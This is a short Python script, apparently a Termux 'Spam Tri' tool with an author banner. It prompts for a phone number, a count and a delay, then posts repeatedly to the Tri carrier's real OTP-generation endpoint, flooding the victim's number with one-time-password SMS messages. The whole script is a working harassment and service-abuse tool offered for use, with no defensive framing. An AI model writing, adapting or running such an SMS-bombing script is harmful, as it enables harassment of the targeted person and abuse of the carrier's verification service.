import requests,os,time,runtext

class Spamtri:

	def __init__(self):
		pass


	def spam(self):
		self.gl = '\x1b[32;1m'
		self.bl = '\x1b[36;1m'
		self.r = '\x1b[31;1m'
		self.w = '\x1b[37;1m'
		self.yl = '\x1b[1;33m'
		self.no = input('\x1b[33m\nNumber : \x1b[37m')
		self.jl = input('\x1b[33mJumlah : \x1b[37m')
		self.ts = input('\x1b[33mDelay : \x1b[37m');print('\n')
#		self.send = requests.post('https://registrasi.tri.co.id/daftar/generateOTP', data = {'msisdn':no})
		for i in range(int(self.jl)):
			self.send = requests.post('https://registrasi.tri.co.id/daftar/generateOTP', data = {'msisdn':self.no})
			if '200' in self.send.text:
				print('\x1b[37m{} [\x1b[32mSucces\x1b[37m]'.format(self.no))
				time.sleep(int(self.ts))
			else:
				print('\x1b[37m{} [\x1b[31mFailed\x1b[37m]'.format(self.no))
				time.sleep(int(self.ts))

	def main(self):
		self.banner = ('''
\x1b[31m /\                 /\     \x1b[33mfb.me/anonk.yuhuu
\x1b[31m/ \'._    (\_/)  _.'/  \  \x1b[36m╔═╗╔═╗╔═╗╔╦╗  ╔╦╗╦═╗╦
\x1b[31m|.''._'--(o.o)--'_.''.|  \x1b[36m╚═╗╠═╝╠═╣║║║   ║ ╠╦╝║
\x1b[31m \_ / `;=/ " \=;` \ _/   \x1b[36m╚═╝╩  ╩ ╩╩ ╩   ╩ ╩╚═╩
\x1b[31m   `\__| \___/ |__/`  \x1b[37mAuthor    \x1b[32m: sCuby07
\x1b[31m        \(_|_)/       \x1b[37mInstagram \x1b[32m: termux.ghostid
\x1b[31m         " ` "        \x1b[37mGithub    \x1b[32m: github.com/anonkyuhuu
''');os.system('clear')
		runtext.runtext(self.banner, 0.001)
		self.spam()


b = Spamtri()
b.main()
